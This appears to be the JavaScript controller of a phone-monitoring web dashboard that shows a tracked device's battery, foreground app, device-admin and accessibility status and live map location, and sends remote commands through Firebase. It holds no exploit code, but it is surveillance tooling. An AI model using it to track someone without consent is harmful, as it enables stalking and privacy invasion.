// ============================================
// DASHBOARD CONTROLLER — With Live Map
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('[Dashboard] Loaded');

    // Auth check
    if (!AUTH.isLoggedIn()) {
        window.location.href = 'index.html';
        return;
    }

    // ========== STATE ==========
    let selectedDeviceKey = localStorage.getItem('selectedDevice') || null;
    let deviceWatcher = null;

    // Map state
    let miniMap = null;
    let deviceMarker = null;
    let accuracyCircle = null;
    let mapInitialized = false;
    let lastMapUpdate = 0;
    let currentLocation = null;

    // ========== ELEMENTS ==========
    const devicesList = document.getElementById('devicesList');
    const selectedSection = document.getElementById('selectedDeviceSection');
    const selectedName = document.getElementById('selectedDeviceName');
    const selectedStatus = document.getElementById('selectedDeviceStatus');

    const batteryValue = document.getElementById('batteryValue');
    const networkValue = document.getElementById('networkValue');
    const currentAppValue = document.getElementById('currentAppValue');
    const protectionValue = document.getElementById('protectionValue');
    const accuracyValue = document.getElementById('accuracyValue');
    const lastSeenValue = document.getElementById('lastSeenValue');

    const coordsEl = document.getElementById('liveLocationCoords');
    const timeEl = document.getElementById('liveLocationTime');
    const openMapsBtn = document.getElementById('openGoogleMapsBtn');
    const mapLoading = document.getElementById('mapLoading');

    // ========== HEADER BUTTONS ==========
    document.getElementById('logoutBtn').addEventListener('click', () => {
        if (confirm('Logout karna chahte ho?')) {
            AUTH.logout();
            window.location.href = 'index.html';
        }
    });

    document.getElementById('refreshBtn').addEventListener('click', () => {
        location.reload();
    });

    document.getElementById('settingsBtn').addEventListener('click', () => {
        showToast('Settings — coming soon', 'info');
    });

    // ========== DEVICES LISTENER ==========
    Devices.startListening((devices) => {
        renderDevices(devices);

        if (selectedDeviceKey) {
            const device = devices.find(d => d.key === selectedDeviceKey);
            if (device) {
                showDeviceSection(device);
            }
        }
    });

    function renderDevices(devices) {
        if (!devices || devices.length === 0) {
            devicesList.innerHTML = `
                <div class="empty-state">
                    <div class="empty-state-icon">📭</div>
                    <div>Abhi koi device nahi hai</div>
                    <div style="font-size:12px;margin-top:8px;">App install karke setup karo</div>
                </div>
            `;
            return;
        }

        devicesList.innerHTML = devices.map(d => {
            const isActive = d.key === selectedDeviceKey ? 'active' : '';
            const batteryPercent = d.battery?.percent != null ? `${d.battery.percent}%` : '—';
            const name = Devices.getDisplayName(d);

            return `
                <div class="device-card ${isActive}" data-key="${d.key}">
                    <div class="device-card-header">
                        <div class="device-name">${escapeHtml(name)}</div>
                        <div class="device-status-dot ${d.status}"></div>
                    </div>
                    <div class="device-info-row">
                        <span>🔋 ${batteryPercent}</span>
                        <span>${Devices.timeAgo(d.lastSeen)}</span>
                    </div>
                </div>
            `;
        }).join('');

        devicesList.querySelectorAll('.device-card').forEach(card => {
            card.addEventListener('click', () => selectDevice(card.dataset.key));
        });
    }

    function selectDevice(key) {
        console.log('[Dashboard] Selected:', key);
        selectedDeviceKey = key;
        localStorage.setItem('selectedDevice', key);

        devicesList.querySelectorAll('.device-card').forEach(card => {
            card.classList.toggle('active', card.dataset.key === key);
        });

        // Reset map (naya device)
        resetMap();

        const device = Devices.list.find(d => d.key === key);
        if (device) showDeviceSection(device);
    }

    function showDeviceSection(device) {
        selectedSection.classList.remove('hidden');

        selectedName.textContent = Devices.getDisplayName(device);
        selectedStatus.textContent = device.status === 'online' ? '🟢 Online' : '🔴 Offline';
        selectedStatus.className = 'status-badge ' + device.status;

        if (deviceWatcher) Devices.unwatch(deviceWatcher);
        deviceWatcher = Devices.watchDevice(device.key, (d) => {
            updateInfoCards(d);
        });
    }

    function updateInfoCards(d) {
        // Battery
        if (d.battery && d.battery.percent != null) {
            const charging = d.battery.isCharging ? ' ⚡' : '';
            batteryValue.textContent = `${d.battery.percent}%${charging}`;
        } else {
            batteryValue.textContent = '—';
        }

        // Network
        networkValue.textContent = (d.network && d.network.type) ? d.network.type : '—';

        // Current App
        currentAppValue.textContent = (d.currentApp && d.currentApp.name) ? d.currentApp.name : '—';

        // Protection
        if (d.protection) {
            const admin = d.protection.adminActive;
            const access = d.protection.accessibilityEnabled;
            if (admin && access) protectionValue.textContent = '🛡️ Full';
            else if (admin || access) protectionValue.textContent = '⚠️ Partial';
            else protectionValue.textContent = '❌ None';
        } else {
            protectionValue.textContent = '—';
        }

        // Last Seen
        lastSeenValue.textContent = Devices.timeAgo(d.lastSeen);

        // ⭐ LIVE LOCATION UPDATE
        updateLiveLocation(d);
    }

    // ============================================
    // LIVE LOCATION — MAP + GOOGLE MAPS
    // ============================================
    function updateLiveLocation(device) {
        const loc = device.location;

        if (!loc || !loc.lat || !loc.lng) {
            coordsEl.textContent = 'Location available nahi hai';
            coordsEl.classList.remove('has-location');
            timeEl.textContent = '—';
            accuracyValue.textContent = '—';
            openMapsBtn.href = '#';
            openMapsBtn.style.pointerEvents = 'none';
            openMapsBtn.style.opacity = '0.5';
            if (mapLoading) mapLoading.classList.remove('hidden');
            return;
        }

        const lat = loc.lat;
        const lng = loc.lng;
        const acc = loc.accuracy || 0;

        currentLocation = { lat, lng, accuracy: acc };

        // Coordinates display
        coordsEl.textContent = `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
        coordsEl.classList.add('has-location');

        // Time
        timeEl.textContent = Devices.timeAgo(loc.time);

        // Accuracy
        accuracyValue.textContent = acc > 0 ? `${Math.round(acc)}m` : '—';

        // Google Maps link
        openMapsBtn.href = `https://www.google.com/maps?q=${lat},${lng}`;
        openMapsBtn.style.pointerEvents = 'auto';
        openMapsBtn.style.opacity = '1';

        // Hide loading
        if (mapLoading) mapLoading.classList.add('hidden');

        // Update map
        updateMiniMap(lat, lng, acc);
    }

    // ============================================
    // MINI MAP — Leaflet
    // ============================================
    function initMiniMap() {
        if (mapInitialized) return;

        try {
            miniMap = L.map('miniMap', {
                zoomControl: false,
                attributionControl: false,
                dragging: true,
                scrollWheelZoom: false
            }).setView([20.5937, 78.9629], 5);

            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                maxZoom: 19
            }).addTo(miniMap);

            mapInitialized = true;
            console.log('[Map] Mini map initialized');
        } catch (e) {
            console.error('[Map] Init error:', e);
        }
    }

    function updateMiniMap(lat, lng, accuracy) {
        // Initialize map on first location
        if (!mapInitialized) {
            initMiniMap();
        }

        if (!miniMap) return;

        // Throttle — 5 sec minimum gap
        const now = Date.now();
        if (now - lastMapUpdate < 5000 && deviceMarker) return;
        lastMapUpdate = now;

        const latlng = [lat, lng];

        // Marker
        if (deviceMarker) {
            deviceMarker.setLatLng(latlng);
        } else {
            const icon = L.divIcon({
                className: 'custom-marker-wrapper',
                html: '<div class="custom-marker"></div>',
                iconSize: [18, 18],
                iconAnchor: [9, 9]
            });

            deviceMarker = L.marker(latlng, { icon: icon })
                .bindPopup(`📍 Device Location<br>${lat.toFixed(5)}, ${lng.toFixed(5)}`)
                .addTo(miniMap);
        }

        // Accuracy circle
        if (accuracy > 0) {
            if (accuracyCircle) {
                accuracyCircle.setLatLng(latlng);
                accuracyCircle.setRadius(accuracy);
            } else {
                accuracyCircle = L.circle(latlng, {
                    radius: accuracy,
                    color: '#0F3460',
                    fillColor: '#0F3460',
                    fillOpacity: 0.1,
                    weight: 1
                }).addTo(miniMap);
            }
        }

        // Center map
        miniMap.setView(latlng, 16, { animate: true });
    }

    function resetMap() {
        if (deviceMarker && miniMap) {
            miniMap.removeLayer(deviceMarker);
            deviceMarker = null;
        }
        if (accuracyCircle && miniMap) {
            miniMap.removeLayer(accuracyCircle);
            accuracyCircle = null;
        }
        if (mapLoading) mapLoading.classList.remove('hidden');
        coordsEl.textContent = '—';
        coordsEl.classList.remove('has-location');
        timeEl.textContent = '—';
        accuracyValue.textContent = '—';
        openMapsBtn.style.pointerEvents = 'none';
        openMapsBtn.style.opacity = '0.5';
        currentLocation = null;
        lastMapUpdate = 0;
    }

    // ============================================
    // LOCATION ACTIONS
    // ============================================

    // Refresh Location
    document.getElementById('refreshLocationBtn')?.addEventListener('click', async () => {
        if (!selectedDeviceKey) return;

        try {
            await window.db.ref('commands/' + selectedDeviceKey).set({
                cmd: 'LOCATION',
                status: 'pending',
                sentAt: Date.now()
            });
            showToast('📍 Location refresh bheja', 'success');
        } catch (e) {
            showToast('Command fail', 'error');
        }
    });

    // Copy Coordinates
    document.getElementById('copyLocationBtn')?.addEventListener('click', () => {
        if (!currentLocation) {
            showToast('Location available nahi', 'error');
            return;
        }

        const text = `${currentLocation.lat},${currentLocation.lng}`;
        navigator.clipboard.writeText(text).then(() => {
            showToast('✓ Coordinates copy kiye', 'success');
        }).catch(() => {
            showToast('Copy fail hua', 'error');
        });
    });

    // ============================================
    // QUICK ACTIONS
    // ============================================
    document.querySelectorAll('.action-btn').forEach(btn => {
        btn.addEventListener('click', async () => {
            if (!selectedDeviceKey) {
                showToast('Pehle koi device select karo', 'error');
                return;
            }

            const cmd = btn.dataset.cmd;
            await sendCommand(selectedDeviceKey, cmd);

            btn.classList.add('sent');
            btn.disabled = true;
            setTimeout(() => {
                btn.classList.remove('sent');
                btn.disabled = false;
            }, 2000);
        });
    });

    async function sendCommand(deviceKey, cmd) {
        try {
            await window.db.ref('commands/' + deviceKey).set({
                cmd: cmd,
                status: 'pending',
                sentAt: Date.now()
            });
            console.log('[Dashboard] Command sent:', cmd);
            showToast(`✓ ${cmd} bheja gaya`, 'success');
        } catch (e) {
            console.error('[Dashboard] Send error:', e);
            showToast('Command fail hua', 'error');
        }
    }

    // ============================================
    // HELPERS
    // ============================================
    function showToast(message, type = 'info') {
        const toast = document.getElementById('toast');
        toast.textContent = message;
        toast.className = 'toast ' + type;
        toast.classList.remove('hidden');

        clearTimeout(window._toastTimeout);
        window._toastTimeout = setTimeout(() => {
            toast.classList.add('hidden');
        }, 2500);
    }

    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/[&<>"']/g, c => ({
            '&': '&amp;', '<': '&lt;', '>': '&gt;',
            '"': '&quot;', "'": '&#39;'
        }[c]));
    }

    // Init map on first load
    setTimeout(() => {
        initMiniMap();
    }, 500);
});
